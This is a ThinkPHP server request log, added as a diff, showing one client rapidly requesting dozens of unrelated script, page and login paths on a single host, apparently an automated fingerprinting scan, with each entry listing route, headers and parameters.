+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/static/js/lang_json_cn.js
+[运行时间：0.082201s] [吞吐率：12.17req/s] [内存消耗：1,834.82kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'js',
+    2 => 'lang_json_cn.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/api/v1/member/home
+[运行时间：0.081866s] [吞吐率：12.22req/s] [内存消耗：1,834.27kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'v1',
+    2 => 'member',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/statics/js/hui.js
+[运行时间：0.145652s] [吞吐率：6.87req/s] [内存消耗：1,834.38kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'statics',
+    1 => 'js',
+    2 => 'hui.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/mindex/statics/js/qiandao.js
+[运行时间：0.145046s] [吞吐率：6.89req/s] [内存消耗：1,834.78kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'mindex',
+    1 => 'statics',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/jsonpublic/selectAddtion.asp
+[运行时间：0.136872s] [吞吐率：7.31req/s] [内存消耗：1,834.81kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'jsonpublic',
+    1 => 'selectAddtion.asp',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/static/css/system/login.css?v=SimCloud%20V1.1.0_2018112816
+[运行时间：0.204277s] [吞吐率：4.90req/s] [内存消耗：1,835.09kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'css',
+    2 => 'system',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+  'v' => 'SimCloud V1.1.0_2018112816',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/Application/Basic/Static/css/customerselect.css
+[运行时间：0.119552s] [吞吐率：8.36req/s] [内存消耗：1,835.41kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Application',
+    1 => 'Basic',
+    2 => 'Static',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+  'css' => 'customerselect.css',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/static/index/js/lk/order.js
+[运行时间：0.152677s] [吞吐率：6.55req/s] [内存消耗：1,835.28kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'index',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+  'lk' => 'order.js',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/static/home/static/js/iindex.js
+[运行时间：0.102465s] [吞吐率：9.76req/s] [内存消耗：1,835.09kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'home',
+    2 => 'static',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+  'js' => 'iindex.js',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/views/ucenter/ucenter.js
+[运行时间：0.151899s] [吞吐率：6.58req/s] [内存消耗：1,834.80kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'views',
+    1 => 'ucenter',
+    2 => 'ucenter.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/chs/js/lang_zh_tw.js
+[运行时间：0.151160s] [吞吐率：6.62req/s] [内存消耗：1,834.37kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'chs',
+    1 => 'js',
+    2 => 'lang_zh_tw.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/EIMSII/assets/bundle/commons.js
+[运行时间：0.133905s] [吞吐率：7.47req/s] [内存消耗：1,834.60kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'EIMSII',
+    1 => 'assets',
+    2 => 'bundle',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/index.html?findcli=-1
+[运行时间：0.073735s] [吞吐率：13.56req/s] [内存消耗：1,767.20kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+  'findcli' => '-1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/cn.gzjs
+[运行时间：0.123440s] [吞吐率：8.10req/s] [内存消耗：1,834.34kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cn.gzjs',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/views/bank/bank.html
+[运行时间：0.156282s] [吞吐率：6.40req/s] [内存消耗：1,834.37kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'views',
+    1 => 'bank',
+    2 => 'bank',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:05+08:00 ] 96.5.50.109 GET 101.37.13.45/index3.php?m=Order&a=hetong&id=999999
+[运行时间：0.091459s] [吞吐率：10.93req/s] [内存消耗：1,835.61kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index3.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'Order',
+  'a' => 'hetong',
+  'id' => '999999',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/case/
+[运行时间：0.124982s] [吞吐率：8.00req/s] [内存消耗：1,834.30kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'case',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/Template/Home/Run/record.html
+[运行时间：0.173567s] [吞吐率：5.76req/s] [内存消耗：1,834.42kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Template',
+    1 => 'Home',
+    2 => 'Run',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/Pay/index.php
+[运行时间：0.141761s] [吞吐率：7.05req/s] [内存消耗：1,834.45kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Pay',
+    1 => 'index.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/gai/ucms/login.php
+[运行时间：0.131453s] [吞吐率：7.61req/s] [内存消耗：1,834.34kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'gai',
+    1 => 'ucms',
+    2 => 'login.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/smb_scheduler/cdr.htm
+[运行时间：0.163957s] [吞吐率：6.10req/s] [内存消耗：1,834.26kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'smb_scheduler',
+    1 => 'cdr.htm',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/Public/Manage/js/cvphp.js
+[运行时间：0.148449s] [吞吐率：6.74req/s] [内存消耗：1,834.76kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Public',
+    1 => 'Manage',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/Public/mobile/js/config.js
+[运行时间：0.147175s] [吞吐率：6.79req/s] [内存消耗：1,834.76kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Public',
+    1 => 'mobile',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/images2/bankCheck.js
+[运行时间：0.147651s] [吞吐率：6.77req/s] [内存消耗：1,834.32kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images2',
+    1 => 'bankCheck.js',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.109',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:06+08:00 ] 96.5.50.109 GET 101.37.13.45/trade/quote/list
+[运行时间：0.150223s] [吞吐率：6.66req/s] [内存消耗：1,834.58kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'trade',
+    1 => 'quote',
+    2 => 'list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
